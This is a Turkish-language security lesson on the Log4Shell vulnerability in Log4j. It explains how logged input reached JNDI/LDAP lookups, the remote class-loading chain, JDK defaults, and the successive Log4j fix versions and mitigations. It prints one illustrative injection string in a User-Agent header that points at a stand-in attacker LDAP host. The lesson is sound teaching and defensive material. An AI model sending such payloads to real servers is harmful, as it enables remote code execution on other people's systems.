> **Kaynak kapsamı:** 1.1’in açılış Log4Shell vakası ve bilgi güvenliği tanım kutusu; `teori-1-1-42.pdf` fiziksel sayfa 13–16 / basılı sayfa 2–5. Sayfa 13’teki haftalık hedef listesi ve sayfa 16’da başlayan 1.1.1 bu dersin kapsamı değildir. Kod 1.1–1.3, altı adım ve sürüm tablosu görsel olarak okunmuştur. Tarih/protokol düzeltmeleri aşağıda açıkça birincil kaynakla gösterilir; mekanizma şeması ve öğretici yorumlar ek anlatımdır.

## Bir günlük satırı neden bir güvenlik vakasına dönüştü?

Aralık 2021’de duyulan **Log4Shell — CVE-2021-44228**, Java dünyasında yaygın kullanılan Log4j’nin günlük mesajlarını işleme biçimini kritik bir saldırı yoluna dönüştürdü. Uygulamanın amacı yalnızca gelen isteği kaydetmekti. Fakat kayıt için aldığı metin, kütüphanenin yorumlayacağı bir ifadeye dönüşebiliyordu. Sorun “günlük tutmak kötüdür” değil, güvenilmeyen veriye o işlem için gerekmeyen bir yetenek verilmesiydi.

Kaynak sohbet mesajı, kullanıcı adı, HTTP başlığı ve cihaz adı gibi alışıldık girdileri sayar. Bunların tehlikeli görünmesi gerekmez; sonradan hangi bileşende yorumlandıkları önemlidir. “Kullanıcı bunu yalnız metin olarak yazdı” demek, sistemin sonradan onu yalnız metin olarak ele aldığı anlamına gelmez.

[Bilgi güvenliği](glossary:information-security), bilgi ve sistemleri yetkisiz erişim, kullanım, ifşa, değiştirme ve yok edilmeye karşı korumayı amaçlar. Kaynağın temel dersi budur: sistemin yapacağı işler kadar **yapmaması gereken davranışları** da tasarlamak gerekir.

## Veri ile talimatın karıştığı yer

Kaynağın olağan günlük satırını, görseldeki düzgün Java sözdizimiyle okuyalım:

```java
logger.info("Gelen istek, User-Agent: {}", userAgent);
```

`userAgent`, istemcinin HTTP başlığından gelir; saldırganın denetleyebildiği bir değerdir. `{}` ile parametre vermek, saldırıya açık eski Log4j’nin sonradan yapacağı mesaj yorumlamasını kendiliğinden engellemiyordu. Kaynağın **message lookup substitution — mesaj araması** dediği özellik, biçimlendirilmiş mesajda `${...}` ifadelerini çözümleyebiliyordu.

**Enjeksiyon — injection** örüntüsü burada görünür: yalnız veri olması beklenen metin bir yorumlayıcıya talimat taşır. Kaynağın verdiği örnek biçim, bir saldırı çalıştırmadan metin olarak şöyle okunabilir:

```text
User-Agent: ${jndi:ldap://saldirgan.example:1389/a}
```

`jndi`, Java Naming and Directory Interface üzerinden ad çözümlemeyi seçer; `ldap://` ağdaki dizin hizmetini gösterir; adres ve `/a`, çözümlenecek başvuruyu belirtir. Bu örnek alan adı kaynaktaki açıklama içindir, çalışan bir hedef değildir.

Kaynağın sadeleştirilmiş kütüphane kodunda `JndiLookup`, `jndiManager.lookup(key)` çağırır; yönetici katmanındaki kritik işlem `this.context.lookup(name)` olur. Önemli geçiş, günlük verisinden ağ üzerinden nesne çözümlemeye gidilmesidir. “Tehlikeli bir API’yi uygulama kodumda doğrudan çağırmadım” savunması bu bağımlılık zincirini görmezden gelir.

## Altı adımın her biri bir güven varsayımıdır

Kaynağın tarihsel, uzaktan sınıf yüklemeye izin veren ortam için zinciri şöyledir:

1. Denetlenen bir girdi JNDI/LDAP ifadesini taşır.
2. Uygulama bu girdiyi `logger.info` ile kaydeder.
3. Etkilenen Log4j, mesajdaki ifadeyi bulup `JndiLookup` yoluna aktarır.
4. JNDI, belirtilen LDAP hizmetine bağlanıp nesne başvurusu alır.
5. Uygun JVM/ayar koşullarında, başvurunun `javaCodeBase` alanındaki HTTP konumundan sınıf alınır.
6. Nesne fabrikasının `getObjectInstance()` yolu çalıştığında saldırganın kodu uygulamanın yetkileriyle yürütülebilir.

Kaynak Kod 1.3’teki kaydın alanlarını anlamak, onu körlemesine kopyalamaktan daha yararlıdır:

| Alan                               | Örnekteki görevi                                      |
| ---------------------------------- | ----------------------------------------------------- |
| `dn`                               | Dizin kaydının adı                                    |
| `objectClass: javaNamingReference` | Kaydın Java nesne başvurusu olarak sunulması          |
| `javaClassName`                    | Başvurulan sınıfın adı                                |
| `javaCodeBase`                     | Sınıfın alınacağı konum                               |
| `javaFactory`                      | Nesnenin oluşturulmasında kullanılacak fabrika sınıfı |

Bu üç kod örneğinin ortak dersi bir [güven sınırıdır](glossary:trust-boundary): internetten gelen metin, uygulamanın kendi yetkileriyle ağ ve nesne işlemi başlatmasına yol açmaktadır. **Yazar açıklaması:** Girdinin günlüğe erişmesi, ağ erişimi ve uygun çalışma zamanı davranışı farklı koşullardır; bu zinciri her Java uygulamasında kaçınılmazmış gibi okumamak gerekir.

## “JDK güncel, o hâlde sorun yok” çıkarımı neden eksik?

Kaynak, JDK 8u191 ile LDAP üzerinden uzak codebase sınıf yüklemesinin varsayılan olarak kapatıldığını anlatır. Bu davranış [OpenJDK 8u191 kaynak kodunda](https://raw.githubusercontent.com/openjdk/jdk8u/jdk8u191-b12/jdk/src/share/classes/com/sun/jndi/ldap/VersionHelper12.java) `com.sun.jndi.ldap.object.trustURLCodebase` değerinin varsayılan `false` olmasıyla görülebilir. Bu kontrol özellikle yukarıdaki uzak sınıf indirme yolunu sınırlar.

Ancak kaynak, bazı ortamların zaten classpath’te bulunan sınıflarla serileştirilmiş nesne/gadget zincirleri üzerinden istismar edilebildiğini de belirtir. Bir [gadget zinciri](glossary:gadget-chain), mevcut sınıfların yan etkilerinin istenmeyen davranışa bağlanmasıdır. **Ek açıklama:** Bu da uygun sınıflar, ayarlar ve çağrı yolları gerektirir; her JDK güncellemesi aynı güvenceyi vermediği gibi, her kurulumda aynı alternatif zincir varmış gibi de düşünülmemelidir.

Ders, tek savunmanın değersiz olduğu değil, **tek yolun engellenmesinin tüm zafiyetin giderilmesine eşit olmadığıdır**. [Saldırı ağaçlarındaki](topic:attack-trees-portal-model) alternatif yol fikri burada somutlaşır.

## Ardışık düzeltmeler: aynı sorun adı altında farklı yollar

Aşağıdaki tablo, kitabın tarihsel sırayı öğretme amacını korur. 2.15.0 satırındaki tarih ve protokol ayrıntısı, [Apache sürüm notlarıyla](https://logging.apache.org/log4j/2.x/release-notes.html#release-notes-2-15-0) düzeltilmiştir: PDF **10 Aralık** ve yalnız `java` der; sürüm notları **6 Aralık 2021** ile `java`, `ldap`, `ldaps` kısıtlarını belirtir.

| Sürüm  | Sürüm tarihi   | Öğretici değişiklik / takip eden sorun                                                                                     |
| ------ | -------------- | -------------------------------------------------------------------------------------------------------------------------- |
| 2.15.0 | 6 Aralık 2021  | Mesaj araması varsayılanda kapandı, JNDI yolları daraltıldı; bazı yapılandırmalarda yetersizlik CVE-2021-45046 ile izlendi |
| 2.16.0 | 13 Aralık 2021 | Mesaj araması kaldırıldı, JNDI varsayılan olarak devre dışı bırakıldı                                                      |
| 2.17.0 | 17 Aralık 2021 | Kendine gönderme yapan aramalardaki kontrolsüz özyinelemeye bağlı DoS, CVE-2021-45105                                      |
| 2.17.1 | 27 Aralık 2021 | JDBC Appender/JNDI yolu, CVE-2021-44832                                                                                    |

**Kapsam açıklaması:** PDF’nin geniş `2.0-beta9–2.14.1` ifadesi tek başına eksiksiz sürüm matrisi değildir. [Apache güvenlik kaydı](https://logging.apache.org/security.html#CVE-2021-44228), `log4j-core` ile yalnız `log4j-api` kullanımını ayırır ve geri taşınmış düzeltme dallarını listeler. Bu yüzden yalnız uygulamanın Java kullandığını bilerek etkilenme kararı verilmez. JDBC yolunda yapılandırma yazma yetkisi koşulu da ilk mesaj-girdisi senaryosundan farklıdır.

## Geçici azaltım ile kalıcı düzeltmeyi ayır

PDF, tarihsel acil önlemler olarak 2.10 ve sonrası için `-Dlog4j2.formatMsgNoLookups=true` ayarını ve JAR içinden `JndiLookup.class` kaldırılmasını anıyor. Bunlar o dönemin belirli yollarını azaltma örnekleridir; bütün sonraki CVE’leri kapatan güncel bir işletim talimatı olarak sunulmuyor. **Azaltım**, saldırı olasılığını/yolunu geçici sınırlayabilir; **düzeltme**, ilgili kusurun giderilmesidir ve hangi sürüm/koşul için konuşulduğu belirtilmelidir.

Güncellenmemiş bağımlılık, unutulmuş port, varsayılan parola veya düşünmeden onaylanan bir mesaj zincirin ilk halkası olabilir. Kaynağın vaka üzerinden istediği alışkanlık, bu küçük güven ilişkilerini zincir büyümeden görmektir. Bunun düşünme biçimini [güvenlik zihniyeti](topic:security-mindset), sistematik yöntemini [tehdit modelleme](topic:threat-modeling-stride) dersinde bulabilirsin.
